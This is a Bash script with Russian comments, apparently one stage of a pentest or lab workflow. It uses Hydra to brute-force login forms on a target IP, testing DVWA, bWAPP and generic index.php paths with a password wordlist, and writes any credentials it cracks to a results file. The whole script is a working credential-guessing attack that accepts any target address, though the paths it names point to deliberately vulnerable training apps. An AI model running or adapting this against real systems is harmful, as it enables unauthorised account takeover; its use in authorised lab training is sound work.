#!/bin/bash

TARGET_IP="${1:-33.57.84.200}"
WORDLIST="${2:-rockyou.txt}"
RESULTS_FILE="${3:-results.txt}"
LOGINLIST="${4:-logins.txt}"

BLUE='\033[0;34m'
GREEN='\033[0;32m'
WHITE='\033[0;37m'

HYDRA_LOG="/tmp/hydra_output_$$.txt"

log_info() {
    echo -e "${BLUE}[HYDRA-INFO]${WHITE} $1" | tee -a $RESULTS_FILE
}

log_success() {
    echo -e "${GREEN}[HYDRA-SUCCESS]${WHITE} $1" | tee -a $RESULTS_FILE
}

log_error() {
    echo -e "${BLUE}[HYDRA-ERROR]${WHITE} $1" | tee -a $RESULTS_FILE
}

main() {
    echo "" | tee -a $RESULTS_FILE
    log_info "===== ЭТАП 2: Hydra Bruteforce веб-формы ====="
    log_info "Целевой IP: $TARGET_IP"
    log_info "Словарь: $WORDLIST"
    
    # Проверяем, существует ли словарь
    if [ ! -f "$WORDLIST" ]; then
        log_error "Словарь $WORDLIST не найден"
        log_info "Создаю простой тестовый словарь..."
        cat > "$WORDLIST" << 'EOF'
admin
password
admin123
123456
root
test
guest
user
password123
admin@123
EOF
        log_success "Словарь создан: $WORDLIST"
    fi
    
    log_info "Запускаем Hydra для брутфорса формы входа..."
    
    # Пробуем разные пути к форме входа
    login_paths=(
        "/dvwa/login.php:username=^USER^&password=^PASS^:F=Login failed"
        "/bwapp/login.php:login=^USER^&password=^PASS^:F=Invalid credentials or user not activated!"
        "/index.php:user=^USER^&pass=^PASS^:F=invalid"
    )
    
    found=0
    
    for path in "${login_paths[@]}"; do
        log_info "Тестируем путь: $path"
        
        # Запускаем Hydra
        hydra -L "$LOGINLIST" \
              -P "$WORDLIST" \
              -f \
              -v \
              -t 4 \
              -S \
              -o "$HYDRA_LOG" \
              "$TARGET_IP" \
              http-post-form "$path" 2>/dev/null &
        
        local hydra_pid=$!
        local timeout=120
        local elapsed=0
        
        # Ждём результатов
        while [ $elapsed -lt $timeout ]; do
            sleep 1
            elapsed=$((elapsed + 1))
            
            # Проверяем логи
            if [ -f "$HYDRA_LOG" ]; then
                # Ищем успешные учётные данные
                if grep -q "\[80\]\[http-post-form\]" "$HYDRA_LOG"; then
                    credentials=$(grep -oP '\[80\]\[http-post-form\].*?\K.*' "$HYDRA_LOG" | head -1)
                    if [ ! -z "$credentials" ]; then
                        log_success "Учётные данные найдены: $credentials"
                        echo "Login Path: $path" >> $RESULTS_FILE
                        echo "Credentials: $credentials" >> $RESULTS_FILE
                        kill $hydra_pid 2>/dev/null
                        found=1
                        break
                    fi
                fi
            fi
            
            # Проверяем, жив ли процесс
            if ! kill -0 $hydra_pid 2>/dev/null; then
                break
            fi
            
            # Выводим прогресс каждые 15 секунд
            if [ $((elapsed % 15)) -eq 0 ]; then
                log_info "Поиск продолжается... (${elapsed}s/${timeout}s)"
            fi
        done
        
        # Убиваем процесс если всё ещё работает
        kill $hydra_pid 2>/dev/null
        wait $hydra_pid 2>/dev/null
        
        if [ $found -eq 1 ]; then
            break
        fi
    done
    
    if [ $found -eq 0 ]; then
        log_error "Учётные данные не найдены за отведённое время"
    fi
    
    rm -f "$HYDRA_LOG"
    echo "" | tee -a $RESULTS_FILE
}

main "$@"
